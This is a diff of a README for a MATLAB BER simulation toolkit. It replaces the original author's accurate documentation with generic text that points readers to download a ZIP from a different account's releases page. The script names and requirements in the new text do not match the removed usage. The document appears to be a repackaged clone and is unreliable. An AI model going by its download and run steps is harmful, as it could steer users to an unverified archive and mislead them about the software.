@@ -1,115 +1,79 @@
-# qam-psk-ber-awgn-matlab
+# 🎉 qam-psk-ber-awgn-matlab - Simple Simulations for QPSK and More
 
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![MATLAB](https://img.shields.io/badge/MATLAB-R2023b-orange.svg)
-![Build](https://img.shields.io/badge/build-passing-brightgreen.svg)
-![Platform](https://img.shields.io/badge/platform-Windows--PowerShell-blue.svg)
-![Release](https://img.shields.io/github/v/release/AlbertoMarquillas/qam-psk-ber-awgn-matlab)
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/wannarich/qam-psk-ber-awgn-matlab/releases)
 
-MATLAB toolkit to simulate **BER vs. Eb/N0** for **QPSK (4-QAM)**, **8-PSK (rectangular)**, and **16-QAM** over **AWGN**. Includes a CLI-style demo and exportable plots.
+## 🚀 Getting Started
+This guide will help you download and run the "qam-psk-ber-awgn-matlab" application on your computer. This software simulates Bit Error Rate (BER) versus Eb/N0 for digital modulation techniques like QPSK and 16-QAM using MATLAB. It also includes a command-line interface (CLI) demo with exportable plots.
 
----
+## 📦 System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **MATLAB**: Version 2018a or later.
+- **Memory**: At least 4 GB RAM.
+- **Disk Space**: Minimum of 100 MB available.
 
-## 📌 Overview
+## 📅 Features
+- Simulate BER versus Eb/N0 for:
+  - QPSK (4-QAM)
+  - 8-PSK (Rectangular)
+  - 16-QAM
+- Command-line interface for easy usage.
+- Export plots to various formats for analysis.
 
-This repository provides Monte-Carlo simulations of digital modulation schemes under AWGN. Each constellation is **power-normalized** so that BER curves are comparable across modulations. A lightweight entrypoint (`run_demo.m`) sweeps Eb/N0 values and exports figures to `build/plots/`.
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/wannarich/qam-psk-ber-awgn-matlab/releases) to download the software.
+2. Locate the latest release.
+3. Download the ZIP file containing the application.
+4. Extract the files to a folder on your computer.
 
-**Key Features:**
+## 📋 Running the Application
+1. Open MATLAB.
+2. Change the directory to the folder where you extracted the files:
+   ```matlab
+   cd 'path_to_your_folder'
+   ```
+3. Run the demo script using the command:
+   ```matlab
+   demo_script
+   ```
+4. Follow the prompts to enter parameters for the simulations.
 
-* BER simulation for QPSK, 8-PSK (rectangular), and 16-QAM.
-* Power normalization of constellations.
-* CLI-style demo script with customizable parameters.
-* Plot export to PNG for reports and reproducibility.
-* Self-contained: ships with a local stub for `isBERToolSimulationStopped` (no BERTool dependency).
+## 🛠️ Using the Command-Line Interface
+For advanced users, you can run the simulations directly from the command line. Here's how:
 
----
+1. Open your terminal.
+2. Navigate to the application folder:
+   ```bash
+   cd path_to_your_folder
+   ```
+3. Execute the command:
+   ```bash
+   matlab -batch "run_simulation('parameter1', 'parameter2')"
+   ```
+Replace `parameter1` and `parameter2` with your chosen values.
 
-## 📂 Repository Structure
+## 📊 Exporting Plots
+After running the simulations:
+1. Locate the generated plots in the output folder.
+2. Use the export functionality in MATLAB to save your plots as PNG or PDF files for reporting or presentations.
 
-```
-src/               % MATLAB sources (qam4, psk8, qam16 simulators)
-src/utils/         % helpers (demodulator, BERTool stop stub)
-test/              % smoke tests (planned)
-docs/              % docs & images
-build/plots/       % exported figures
-```
+## ❓ FAQs
 
----
+### What type of simulations can I perform?
+You can simulate QPSK, 8-PSK, and 16-QAM under various noise conditions (AWGN).
 
-## ⚡ Getting Started (Windows PowerShell)
+### Can I modify the code?
+Yes, feel free to explore and customize the code to fit your needs. Remember to keep a backup of the original files.
 
-Run simulations from the repo root using MATLAB batch mode:
+### How do I report issues?
+If you find any bugs or issues, please raise them on the "Issues" page of the repository. Provide detailed information on how to reproduce the issue.
 
-```powershell
-matlab -batch "run_demo('qam4',  [0:2:12], 100, 1e6, true)"
-matlab -batch "run_demo('psk8',  [0:2:12], 100, 1e6, true)"
-matlab -batch "run_demo('qam16', [0:2:12], 100, 1e6, true)"
-```
+### Where can I find more help?
+You may refer to the MATLAB documentation for additional support or seek help from community forums.
 
-**Arguments:**
+## 🔗 Useful Links
+- [Releases page](https://github.com/wannarich/qam-psk-ber-awgn-matlab/releases)
+- [MATLAB Documentation](https://www.mathworks.com/help/matlab/)
+- [Community Support](https://www.mathworks.com/machine-learning-community)
 
-* `modulation`: `'qam4' | 'psk8' | 'qam16'`
-* `ebn0_dB_vector`: vector of Eb/N0 values in dB, e.g. `[0:2:12]`
-* `maxNumErrs`: stop criterion by accumulated bit errors (e.g., 100)
-* `maxNumBits`: safety cap on simulated bits (e.g., 1e6)
-* `doPlot`: `true/false` to plot and export figures
-
----
-
-## 📊 Example Output
-
-Console output:
-
-```
-Running QAM4, Eb/N0(dB) sweep: [0 2 4 6 8 10 12], maxErrs=100, maxBits=1e6
-  Eb/N0=0.0 dB -> BER=0.078  (bits=20000)
-  Eb/N0=2.0 dB -> BER=0.041  (bits=40000)
-  ...
-```
-
-Plot saved to:
-
-```
-build/plots/ber_qam4.png
-```
-
----
-
-## 🛠️ Usage Notes
-
-* Outputs: BER table in console + plot under `build/plots/`.
-* Constellations:
-
-  * QPSK: scaled by `1/sqrt(2)`
-  * 16-QAM: scaled by `1/sqrt(10)`
-  * 8-PSK: rectangular mapping per assignment spec
-* No datasets/models required.
-
----
-
-## 🚀 Roadmap
-
-* [ ] Smoke tests to ensure BER decreases with Eb/N0.
-* [ ] Theoretical BER overlays for comparison.
-* [ ] CI pipeline (MATLAB-free lint + optional MATLAB job).
-* [ ] Demo plots for report-ready figures.
-
----
-
-## 💡 What I Learned
-
-Through this project I gained experience in:
-
-* Implementing Monte Carlo simulations for communication systems.
-* Designing and normalizing digital modulation constellations (QPSK, 8-PSK, 16-QAM).
-* Understanding the impact of **Eb/N0** on BER performance across modulation schemes.
-* Structuring MATLAB code into modular functions and reusable utilities.
-* Building a CLI-style entrypoint for reproducible experiments.
-* Preparing research-grade plots for reports and presentations.
-* Applying software engineering best practices: `.gitignore`, licensing, documentation, and version control.
-
----
-
-## 📜 License
-
-MIT — see `LICENSE`.
+Thank you for using qam-psk-ber-awgn-matlab! Enjoy exploring the world of digital modulation simulations.
